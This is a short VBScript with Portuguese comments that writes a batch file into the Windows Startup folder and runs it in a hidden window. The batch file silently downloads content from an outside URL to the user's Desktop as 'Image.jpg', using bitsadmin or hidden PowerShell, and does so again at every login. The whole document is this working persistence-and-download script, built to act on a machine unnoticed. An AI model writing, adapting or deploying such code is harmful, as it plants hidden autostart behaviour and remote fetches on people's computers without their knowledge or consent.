' Script VBS que cria um .bat na pasta Inicialização para baixar uma imagem

Set oWS = CreateObject("WScript.Shell")
Set fso = CreateObject("Scripting.FileSystemObject")

startupPath = oWS.SpecialFolders("Startup")
batPath = startupPath & "\dro.bat"

batCode = "@echo off" & vbCrLf & _
          "ver | findstr /i ""5\.1"" >nul" & vbCrLf & _
          "if %errorlevel%==0 (" & vbCrLf & _
          "  bitsadmin /transfer fdp /download /priority foreground https://dro.pm/chap Image.jpg" & vbCrLf & _
          "  move /Y Image.jpg %USERPROFILE%\Desktop" & vbCrLf & _
          ") else (" & vbCrLf & _
          "  powershell -WindowStyle Hidden -Command ""Invoke-WebRequest 'https://dro.pm/chap' -OutFile $env:USERPROFILE\Desktop\Image.jpg""" & vbCrLf & _
          ")"

Set batFile = fso.CreateTextFile(batPath, True)
batFile.WriteLine batCode
batFile.Close

' Opcional: executar o .bat imediatamente para baixar a imagem sem reiniciar
oWS.Run Chr(34) & batPath & Chr(34), 0, False
